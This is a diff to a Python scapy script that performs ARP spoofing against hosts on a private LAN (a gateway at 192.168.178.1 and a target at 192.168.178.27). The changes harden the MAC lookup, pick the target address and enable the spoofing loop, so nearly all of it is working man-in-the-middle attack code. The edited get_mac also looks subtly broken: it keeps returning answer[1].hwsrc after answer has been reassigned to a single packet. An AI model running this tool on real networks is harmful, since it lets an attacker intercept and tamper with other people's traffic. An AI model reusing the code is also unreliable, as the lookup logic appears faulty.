@@ -26,7 +26,12 @@ def get_mac(ip):
     #     print("--------")
     # print("###############################################")
     # print("###############################################")
-    answer = [answer for answer in answered_list if answer[1].op == 2][0]
+    answered_list = [answer for answer in answered_list if answer[1].op == 2]
+    if len(answered_list) == 0:
+        return None
+    answer = answered_list[0][1]
+
+    # print(answer[0].show())
     # print(answer)
     # print(ans.show())
     return answer[1].hwsrc
@@ -34,6 +39,9 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
+    if not target_mac:
+        print(f"\tcant resolve mac for {target_ip}")
+        return
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
@@ -45,13 +53,13 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-# target_ip = "192.168.178.27"
-target_ip = "192.168.178.33"
+target_ip = "192.168.178.27"
+# target_ip = "192.168.178.33"
 gateway_ip = "192.168.178.1"
 
 
-print(get_mac(gateway_ip))
-exit(1)
+# print(get_mac(gateway_ip))
+# exit(1)
 
 try:
     packets_sent_count = 0
